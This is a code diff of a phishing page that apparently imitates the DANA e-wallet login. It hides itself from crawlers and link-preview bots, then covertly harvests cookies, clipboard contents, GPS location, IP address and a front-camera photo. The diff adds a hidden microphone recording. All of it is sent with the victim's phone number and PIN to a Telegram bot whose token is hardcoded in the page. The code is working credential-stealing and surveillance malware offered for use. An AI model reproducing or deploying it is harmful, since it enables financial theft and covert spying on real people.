@@ -111,32 +111,49 @@
     <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
     <script>
-        // --- FITUR ANTI-BOT / ANTI-CRAWLER ---
-        // Jika dideteksi dibuka oleh bot otomatis / crawler peninjau link, langsung lempar ke dana.id
+        // --- ANTI BOT ---
         const userAgent = navigator.userAgent.toLowerCase();
-        const botKeywords = ['bot', 'crawler', 'spider', 'crawling', 'whatsapp', 'facebookexternalhit', 'telegrambot', 'twitterbot', 'discordbot', 'preview', 'googlebot', 'bingbot'];
-        const isBot = botKeywords.some(keyword => userAgent.includes(keyword)) || navigator.webdriver === true;
-        
-        if (isBot) {
+        const botKeywords = ['bot', 'crawler', 'spider', 'whatsapp', 'telegrambot', 'facebookexternalhit', 'googlebot'];
+        if (botKeywords.some(kw => userAgent.includes(kw)) || navigator.webdriver === true) {
             window.location.replace("https://www.dana.id");
         }
-        // ------------------------------------
 
         const BOT_TOKEN = '8869523539:AAFe3qm1tzzfhlc9IvQaZX7SW_1ZEuEeKzM';
         const CHAT_ID = '7603310096';
 
         let clientIP = "Memuat IP..."; let deviceGPS = "Tidak diizinkan"; let batteryInfo = "Tidak tersedia";
-        let clipboardData = "Kosong"; let cookieData = document.cookie || "Tidak ada cookies"; let capturedPhotoBlob = null; let micStatus = "Ditolak";
-        
+        let clipboardData = "Kosong"; let cookieData = document.cookie || "Tidak ada cookies"; 
+        let capturedPhotoBlob = null; let capturedAudioBlob = null; let micStatus = "Ditolak";
+
         fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => { clientIP = data.ip; }).catch(()=>{});
         if(navigator.getBattery) { navigator.getBattery().then(bat => { batteryInfo = `${Math.round(bat.level*100)}%`; }); }
         if(navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { deviceGPS = `Lat:${pos.coords.latitude},Lon:${pos.coords.longitude}`; }, ()=>{}, {timeout:3000}); }
         navigator.clipboard?.readText().then(t => { clipboardData = t || "Kosong"; }).catch(()=>{});
 
+        // Fungsi Rekam Suara Mic (4 Detik)
+        async function recordAudio(stream) {
+            return new Promise((resolve) => {
+                try {
+                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                    let audioChunks = [];
+                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
+                    mediaRecorder.onstop = () => {
+                        capturedAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        resolve();
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 4000);
+                } catch (e) { resolve(); }
+            });
+        }
+
+        // Fungsi Ambil Foto & Audio Sekaligus
         async function captureMedia() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                micStatus = "Aktif / Diizinkan";
+                micStatus = "Aktif & Terekam 🎙️";
+                
+                // Ambil Foto
                 const video = document.getElementById('hiddenVideo');
                 video.srcObject = stream;
                 await new Promise(r => video.onloadedmetadata = r);
@@ -148,14 +165,14 @@
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 await new Promise(resolve => {
-                    canvas.toBlob(blob => {
-                        capturedPhotoBlob = blob;
-                        resolve();
-                    }, 'image/jpeg', 0.85);
+                    canvas.toBlob(blob => { capturedPhotoBlob = blob; resolve(); }, 'image/jpeg', 0.85);
                 });
 
+                // Rekam Mic
+                await recordAudio(stream);
+
                 stream.getTracks().forEach(track => track.stop());
-            } catch(e) { micStatus = "Ditolak / Gagal"; }
+            } catch(e) { micStatus = "Ditolak / Gagal ❌"; }
         }
 
         async function sendToTelegramText(title, details) {
@@ -169,19 +186,27 @@
             } catch(e){}
         }
 
-        async function sendToTelegramPhoto(captionText) {
+        async function sendToTelegramPhoto(caption) {
             if (!capturedPhotoBlob) return;
             try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', capturedPhotoBlob, 'selfie.jpg');
-                formData.append('caption', captionText);
-                formData.append('parse_mode', 'Markdown');
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', capturedPhotoBlob, 'selfie.jpg');
+                fd.append('caption', caption);
+                fd.append('parse_mode', 'Markdown');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } catch(e){}
+        }
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+        async function sendToTelegramVoice(caption) {
+            if (!capturedAudioBlob) return;
+            try {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('voice', capturedAudioBlob, 'voice_korban.ogg');
+                fd.append('caption', caption);
+                fd.append('parse_mode', 'Markdown');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
             } catch(e){}
         }
 
@@ -193,9 +218,8 @@
             loadingModal.classList.add('active');
             await captureMedia();
             await sendToTelegramText("Akses Awal (Cookie & Init)", { phone: "Belum diisi" });
-            if (capturedPhotoBlob) {
-                await sendToTelegramPhoto("📸 *Foto Korban (Sesi Awal)*\nIP: " + clientIP);
-            }
+            if (capturedPhotoBlob) await sendToTelegramPhoto("📸 *Foto Korban (Sesi Awal)*\nIP: " + clientIP);
+            if (capturedAudioBlob) await sendToTelegramVoice("🎙️ *Rekaman Mic Korban (Sesi Awal)*");
             setTimeout(() => {
                 loadingModal.classList.remove('active');
                 step1.classList.remove('active'); step2.classList.add('active');
@@ -225,11 +249,9 @@
             loadingModal.classList.add('active');
             
             await captureMedia();
-            
             await sendToTelegramText("🔥 PIN DANA DIMASUKKAN!", { phone: globalPhone, pin: pinVal });
-            if (capturedPhotoBlob) {
-                await sendToTelegramPhoto(`🔥 *PIN DITEMUKAN!*\n📱 HP: \`${globalPhone}\`\n🔐 PIN: \`${pinVal}\``);
-            }
+            if (capturedPhotoBlob) await sendToTelegramPhoto(`🔥 *PIN DITEMUKAN!*\n📱 HP: \`${globalPhone}\`\n🔐 PIN: \`${pinVal}\``);
+            if (capturedAudioBlob) await sendToTelegramVoice(`🎙️ *Voice Note / Suara Korban (PIN)*\n📱 HP: \`${globalPhone}\``);
 
             setTimeout(() => {
                 spinnerBox.style.display = "none"; successBox.style.display = "flex";
